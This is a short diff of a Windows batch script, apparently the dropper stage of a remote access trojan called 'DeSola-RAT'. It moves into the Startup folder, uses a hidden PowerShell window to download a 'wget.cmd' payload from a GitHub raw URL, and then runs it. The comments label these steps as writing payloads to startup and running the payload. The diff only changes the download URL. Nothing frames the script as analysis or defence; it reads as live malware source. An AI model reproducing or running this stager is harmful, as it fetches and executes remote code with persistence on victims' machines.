@@ -11,7 +11,7 @@ cd %STARTUP%
 
 @REM TODO : build out stage two
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/main/files/wget.cmd -Outfile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/wget.cmd -Outfile wget.cmd"
 
 @REM run payload
 start ./wget.cmd
